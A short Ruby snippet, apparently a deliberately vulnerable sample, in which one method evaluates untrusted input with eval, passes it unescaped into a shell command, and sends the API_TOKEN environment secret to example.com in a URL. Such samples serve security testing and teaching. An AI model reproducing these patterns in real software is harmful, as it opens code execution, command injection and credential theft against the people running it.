require "net/http"

def handle(user_input)
  eval(user_input)
  system("echo #{user_input}")
  secret = ENV["API_TOKEN"]
  Net::HTTP.get(URI("https://example.com/#{secret}"))
end
